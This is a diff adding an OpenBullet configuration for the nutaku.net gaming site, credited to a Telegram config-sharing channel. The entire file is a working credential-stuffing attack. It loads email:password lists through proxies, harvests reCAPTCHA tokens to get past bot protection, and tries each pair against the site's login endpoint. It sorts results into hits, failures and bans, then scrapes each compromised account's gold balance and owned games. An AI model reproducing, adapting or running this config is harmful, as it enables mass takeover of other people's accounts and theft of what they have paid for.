@@ -1,0 +1,152 @@
+[SETTINGS]
+{
+  "Name": "nutaku.net",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-12T01:32:32.6216443+08:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LeYrHcUAAAAACfhNNf9zgmdglkcUMwfAkmMD-na&co=aHR0cHM6Ly93d3cubnV0YWt1Lm5ldDo0NDM.&hl=en&v=PdoyIVkd8v16xl_NMp3H0N1Y&size=invisible&cb=oog7e14kzbw3" 
+  
+  HEADER "Host: www.google.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Dest: iframe" 
+  HEADER "Referer: https://www.nutaku.net/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Token PARSE "<SOURCE>" CSS "[id=recaptcha-token]" "value" -> VAR "Token" 
+
+#Post REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LeYrHcUAAAAACfhNNf9zgmdglkcUMwfAkmMD-na" 
+  CONTENT "PdoyIVkd8v16xl_NMp3H0N1Y&reason=q&c=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.google.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.google.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LeYrHcUAAAAACfhNNf9zgmdglkcUMwfAkmMD-na&co=aHR0cHM6Ly93d3cubnV0YWt1Lm5ldDo0NDM.&hl=en&v=PdoyIVkd8v16xl_NMp3H0N1Y&size=invisible&cb=oog7e14kzbw3" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#reCAPTCHA-Token PARSE "<SOURCE>" LR "rresp\",\"" "\"" -> VAR "reCAPTCHA-Token" 
+
+#Get REQUEST GET "https://www.nutaku.net/" 
+  
+  HEADER "Host: www.nutaku.net" 
+  HEADER "Sec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: close" 
+
+#Login REQUEST POST "https://www.nutaku.net/execute-login/" EncodeContent=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&rememberMe=1&recaptcha=<reCAPTCHA-Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: www.nutaku.net" 
+  HEADER "X-Csrf-Token: <COOKIES(XSRF-TOKEN)>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://www.nutaku.net" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.nutaku.net/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" MatchesRegex "400|422" 
+  KEYCHAIN Success OR 
+    KEY "{\"redirectURL\":\"https:\\/\\/www.nutaku.net\\/\"}" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "500" 
+
+#Get REQUEST GET "https://www.nutaku.net/home/" 
+  
+  HEADER "Host: www.nutaku.net" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.nutaku.net/" 
+  HEADER "Dnt: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#Gold PARSE "<SOURCE>" LR "gold cart - balance\"     >" "</" CreateEmpty=FALSE -> CAP "Gold" 
+
+#Get REQUEST GET "https://www.nutaku.net/members/mygames/" 
+  
+  HEADER "Host: www.nutaku.net" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.nutaku.net/home/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#G PARSE "<SOURCE>" LR "general-title full-w txt-one-line\">" "</" Recursive=TRUE -> VAR "G" 
+
+#GG FUNCTION Replace "&amp; Uncensored" "" "<G>" -> VAR "GG" 
+
+#GGG FUNCTION RegexMatch "\\w.*?," "<GG>" -> VAR "GGG" 
+
+#Games FUNCTION Replace "<GGG> " "" "<GG>" -> CAP "Games" 
+
+#GC UTILITY List "G" Length -> VAR "GC" 
+
+#Games_Count FUNCTION Compute "<GC>-1" -> CAP "Games Count" 
+
+SET CAP "Config By" "@wanted_boy"
+SET CAP "Telegram channel" "https://t.me/OpenBullet_CFGs"
+
